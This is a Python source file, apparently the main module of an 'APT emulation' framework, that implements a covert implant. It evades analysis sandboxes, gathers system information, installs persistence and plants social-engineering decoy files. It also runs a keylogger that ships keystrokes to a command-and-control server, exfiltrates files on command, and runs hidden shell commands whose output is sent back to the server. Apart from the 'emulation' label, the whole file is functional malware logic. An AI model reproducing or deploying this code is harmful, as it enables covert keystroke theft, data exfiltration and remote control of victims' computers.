# Enhanced APT Emulation System - Main Entry Point

import os
import time
import json
import sys
from datetime import datetime
from pynput.keyboard import Listener, Key

# Import configuration
from config import (
    TRANSMISSION_INTERVAL, LOG_FILE, BELIEVABLE_FILES, 
    SILENT_MODE, DEBUG_MODE
)

# Import core modules
from core import (
    stealth_manager, c2_client, persistence_manager, recon_manager
)

class APTEmulator:
    """Main APT emulation orchestrator"""
    
    def __init__(self):
        self.session_data = {}
        self.keylog_buffer = []
        self.is_running = True
        
    def initialize(self):
        """Initialize the APT emulation system"""
        try:
            # Initialize stealth mechanisms first
            if not stealth_manager.initialize_stealth():
                if DEBUG_MODE:
                    print("Warning: Stealth initialization failed")
            
            # Check for analysis environment
            if stealth_manager.should_abort_execution():
                if DEBUG_MODE:
                    print("Analysis environment detected, aborting execution")
                return False
            
            # Perform initial system reconnaissance
            self.session_data = recon_manager.get_comprehensive_info()
            
            # Log initial system information
            self._log_session_data()
            
            # Install persistence mechanisms
            if persistence_manager.install_all_persistence():
                if DEBUG_MODE:
                    print("Persistence mechanisms installed")
            
            # Send initial heartbeat to C2
            c2_client.heartbeat(self.session_data.get('basic', {}))
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Initialization failed: {e}")
                )
            return False
    
    def _log_session_data(self):
        """Log session data to file"""
        try:
            with open(LOG_FILE, 'w') as f:
                json.dump(self.session_data, f, indent=2, default=str)
            
            if DEBUG_MODE:
                print(f"Session data logged to {LOG_FILE}")
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Session logging failed: {e}")
                )
    
    def create_decoy_files(self):
        """Create believable files for social engineering"""
        try:
            created_files = []
            
            for filename, content in BELIEVABLE_FILES.items():
                try:
                    with open(filename, 'w') as f:
                        f.write(content)
                    created_files.append(filename)
                    
                    if DEBUG_MODE:
                        print(f"Created decoy file: {filename}")
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Failed to create {filename}: {e}")
                        )
            
            return created_files
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Decoy file creation failed: {e}")
                )
            return []
    
    def start_keylogger(self):
        """Start enhanced keylogging with stealth features"""
        try:
            def on_key_press(key):
                try:
                    # Log the key with timestamp
                    key_data = {
                        'timestamp': datetime.now().isoformat(),
                        'key': None,
                        'type': 'keypress'
                    }
                    
                    if hasattr(key, 'char') and key.char is not None:
                        key_data['key'] = key.char
                    else:
                        key_data['key'] = str(key)
                    
                    self.keylog_buffer.append(key_data)
                    
                    # Flush buffer periodically
                    if len(self.keylog_buffer) >= 100:
                        self._flush_keylog_buffer()
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Keylog error: {e}")
                        )
            
            # Start the keylogger
            with Listener(on_press=on_key_press) as listener:
                if DEBUG_MODE:
                    print("Keylogger started")
                
                # Keep the keylogger running
                while self.is_running:
                    time.sleep(1)
                    
                    # Periodic buffer flush
                    if len(self.keylog_buffer) > 0:
                        stealth_manager.add_jitter(0.5, 2)
                        self._flush_keylog_buffer()
                
                listener.join()
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Keylogger failed: {e}")
                )
    
    def _flush_keylog_buffer(self):
        """Flush keylog buffer to storage and C2"""
        try:
            if not self.keylog_buffer:
                return
            
            # Append to log file
            try:
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        existing_data = json.load(f)
                else:
                    existing_data = {}
                
                if 'keylog' not in existing_data:
                    existing_data['keylog'] = []
                
                existing_data['keylog'].extend(self.keylog_buffer)
                
                with open(LOG_FILE, 'w') as f:
                    json.dump(existing_data, f, indent=2, default=str)
                    
            except Exception as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"Keylog file write failed: {e}")
                    )
            
            # Send to C2 server
            keylog_data = {
                'type': 'keylog',
                'timestamp': datetime.now().isoformat(),
                'data': self.keylog_buffer.copy()
            }
            
            c2_client.send_data(keylog_data, endpoint="/keylog")
            
            # Clear buffer
            self.keylog_buffer.clear()
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Keylog buffer flush failed: {e}")
                )
    
    def start_c2_communication_loop(self):
        """Start the main C2 communication loop"""
        try:
            while self.is_running:
                try:
                    # Send heartbeat
                    c2_client.heartbeat(self.session_data.get('basic', {}))
                    
                    # Check for commands
                    commands = c2_client.receive_commands()
                    if commands:
                        self._process_c2_commands(commands)
                    
                    # Send any buffered data
                    if self.keylog_buffer:
                        self._flush_keylog_buffer()
                    
                    # Wait with jitter
                    stealth_manager.add_jitter(
                        TRANSMISSION_INTERVAL * 0.8,
                        TRANSMISSION_INTERVAL * 1.2
                    )
                    
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"C2 communication error: {e}")
                        )
                    
                    # Wait before retry
                    stealth_manager.add_jitter(30, 60)
                    
        except KeyboardInterrupt:
            self.shutdown()
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"C2 loop failed: {e}")
                )
    
    def _process_c2_commands(self, commands):
        """Process commands received from C2 server"""
        try:
            if not isinstance(commands, list):
                commands = [commands]
            
            for command in commands:
                cmd_type = command.get('type', '')
                
                if cmd_type == 'collect_info':
                    # Refresh system information
                    self.session_data = recon_manager.get_comprehensive_info()
                    c2_client.send_data(self.session_data, endpoint="/info")
                
                elif cmd_type == 'exfiltrate_file':
                    file_path = command.get('path', '')
                    if file_path and os.path.exists(file_path):
                        c2_client.exfiltrate_file(file_path)
                
                elif cmd_type == 'execute_command':
                    cmd = command.get('command', '')
                    if cmd:
                        self._execute_system_command(cmd)
                
                elif cmd_type == 'shutdown':
                    self.shutdown()
                
                elif cmd_type == 'update_persistence':
                    persistence_manager.install_all_persistence()
                
                else:
                    if DEBUG_MODE:
                        print(f"Unknown command type: {cmd_type}")
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command processing failed: {e}")
                )
    
    def _execute_system_command(self, command):
        """Execute system command and return results"""
        try:
            import subprocess
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            
            command_result = {
                'type': 'command_result',
                'command': command,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(command_result, endpoint="/command_result")
            
        except Exception as e:
            error_result = {
                'type': 'command_error',
                'command': command,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(error_result, endpoint="/command_result")
    
    def run_campaign(self):
        """Run the complete APT campaign"""
        try:
            # Initialize the system
            if not self.initialize():
                return False
            
            # Create decoy files
            self.create_decoy_files()
            
            # Check if session is active (basic implementation)
            screen_active = self.session_data.get('basic', {}).get('username') is not None
            
            if screen_active:
                # Start keylogger in background thread
                import threading
                
                keylogger_thread = threading.Thread(
                    target=self.start_keylogger,
                    daemon=True
                )
                keylogger_thread.start()
                
                if DEBUG_MODE:
                    print("APT campaign started - keylogger active")
            
            # Start main C2 communication loop
            self.start_c2_communication_loop()
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Campaign execution failed: {e}")
                )
            return False
    
    def shutdown(self):
        """Gracefully shutdown the APT emulator"""
        try:
            self.is_running = False
            
            # Flush any remaining keylog data
            if self.keylog_buffer:
                self._flush_keylog_buffer()
            
            # Send final status to C2
            shutdown_data = {
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat(),
                'reason': 'normal_shutdown'
            }
            
            c2_client.send_data(shutdown_data, endpoint="/status")
            
            if DEBUG_MODE:
                print("APT emulator shutdown complete")
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Shutdown failed: {e}")
                )

def main():
    """Main entry point"""
    try:
        # Create and run APT emulator
        emulator = APTEmulator()
        emulator.run_campaign()
        
    except KeyboardInterrupt:
        if DEBUG_MODE:
            print("Execution interrupted by user")
    except Exception as e:
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print(f"Main execution failed: {e}")
            )

if __name__ == '__main__':
    main()